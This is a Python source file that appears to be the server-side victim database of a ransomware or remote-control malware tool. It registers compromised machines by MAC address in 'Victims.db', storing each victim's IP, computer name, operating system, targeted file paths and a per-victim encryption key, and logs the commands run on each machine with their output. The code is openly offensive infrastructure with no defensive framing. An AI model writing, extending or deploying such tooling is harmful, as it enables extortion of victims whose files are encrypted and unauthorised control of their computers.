from colorama import Fore, init
import pickle

init(convert=True) # Colorama

def print_green(txt):
    print(Fore.GREEN + txt + Fore.RESET)

def print_red(txt):
    print(Fore.RED + txt + Fore.RESET)

def print_blue(txt):
    print(Fore.CYAN + txt + Fore.RESET)

class Database:
    def __init__(self, file_path):
        self.file_path = file_path
        self.data = self.load_data()

    def load_data(self):
        try:
            with open(self.file_path, 'rb') as file:
                return pickle.load(file)
        except (FileNotFoundError, EOFError):
            return {}

    def save_data(self):
        with open(self.file_path, 'wb') as file:
            pickle.dump(self.data, file)

    def get(self, key):
        return self.data.get(key)

    def set(self, key, value):
        self.data[key] = value
        self.save_data()

    def delete(self, key):
        del self.data[key]
        self.save_data()

def init_DB():
    return Database('Victims.db')

def get_victims():
    DB = init_DB()
    return DB.load_data()

def get_victim_by_ip(ip):
    DB = init_DB()
    victims = get_victims()
    keys = victims.keys()
    for key in keys:
        if victims[key]["ip"] == ip:
            return key

def store_file_paths(ip, paths):
    DB = init_DB()
    isStored = True
    try:
        victimMAC = get_victim_by_ip(ip)
        victimInfo = DB.get(victimMAC)
        if victimInfo:
            victimInfo["files"] = paths
            DB.set(victimMAC, victimInfo)
            DB.save_data()
            print_green(f"[Store File Paths] Paths are stored for {victimMAC}")
    except Exception as e:
        print_red("[Store File Paths] Error occurred while storing file paths.")
        isStored = False
    return isStored

def get_file_paths(ip):
    DB = init_DB()
    victimMAC = get_victim_by_ip(ip)
    victimInfo = DB.get(victimMAC)
    if victimInfo:
        return victimInfo["files"]

def store_key(mac, key):
    DB = init_DB()
    isStored = True
    try:
        victimInfo = DB.get(mac)
        victimInfo["key"] = key
        DB.set(mac, victimInfo)
        DB.save_data()
        print_green(f"[Store Key] Key is stored for {mac}")
    except Exception as e:
        print_red("[Store Key] Error occurred while storing key.")
        isStored = False
    return isStored

def get_key(mac):
    DB = init_DB()
    victim = DB.get(mac)
    try:
        if victim:
            key = victim["key"]
            return key
    except Exception as e:
        return False

def get_victim(mac):
    DB = init_DB()
    victim = DB.get(mac)
    if victim:
        return victim
    return False

def save_client_info(currentIP, msg):
    DB = init_DB()
    isSuccess = False
    try:
        msgType = msg.split("?")[0]
        parameters = msg.split("?")[1].split("&")
        if msgType == "save":
            macAddress = ""
            computerName = ""
            osName = ""
            for parameter in parameters:
                key = parameter.split("=")[0]
                value = parameter.split("=")[1]
                if key == "mac":
                    macAddress = value
                elif key == "name":
                    computerName = value
                elif key == "os":
                    osName = value
        victim = DB.get(macAddress)
        if victim:
            print("[Save Client Info] This MAC address already exists in database.")
            
            storedIP = victim["ip"]
            if currentIP != storedIP:
                info = victim
                info["ip"] = currentIP
                DB.set(macAddress, info)
                print_green("[Save Client Info] Victim's stored IP is updated.")
            
            storedName = victim["name"]
            if computerName != storedName:
                info = victim
                info["name"] = computerName
                DB.set(macAddress, info)
                print_green("[Save Client Info] Victim's stored name is updated.")
            
            storedOS = victim["os"]
            if osName != storedOS:
                info = victim
                info["os"] = osName
                DB.set(macAddress, info)
                print_green("[Save Client Info] Victim's stored operating system is updated.")
        else:
            info = {
                "ip": currentIP,
                "name": computerName,
                "os": osName,
                "files": [],
                "commands": []
                }
            DB.set(macAddress, info)
            print_green(f"[Save Client Info] New victim ({computerName}, {currentIP}, {osName}, {macAddress}) is added into database.")
        DB.save_data()
        isSuccess = True
    except Exception as e:
        print_red("[Save Client Info] Error occurred while saving client info.")
        print(e)
    return isSuccess

def log_command_result(ip, cmd, result):
    DB = init_DB()
    isSuccess = True
    try:
        victimMAC = get_victim_by_ip(ip)
        if victimMAC:
            victimInfo = DB.get(victimMAC)
            victimInfo["commands"].append((cmd, result))
            DB.set(victimMAC, victimInfo)
            DB.save_data()
            print_green(f"[Log Command Result] Command result is stored.")
    except Exception as e:
        print_red("[Log Command Result] Error occurred while logging command output.")
        print(e)
        isSuccess = False
    return isSuccess
    